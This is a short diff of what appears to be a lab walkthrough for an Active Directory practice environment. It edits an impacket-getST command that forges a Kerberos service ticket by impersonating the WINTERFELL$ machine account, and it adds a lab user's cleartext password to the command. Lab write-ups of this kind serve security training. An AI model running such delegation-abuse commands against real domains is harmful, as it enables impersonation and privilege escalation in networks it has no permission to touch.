@@ -80,9 +80,9 @@ We can see that the user of the `WINTERFELL` machine is `WINTERFELL$` so this is
 ```
 ```bash
 
-  impacket-getST -spn CIFS/winterfell.north.sevenkingdoms.local \
+  impacket-getST -spn cifs/winterfell.north.sevenkingdoms.local \
       -impersonate WINTERFELL$ \
-      north.sevenkingdoms.local/jon.snow \
+      north.sevenkingdoms.local/jon.snow:iknownothing \
       -dc-ip 10.2.10.11
 
 ```
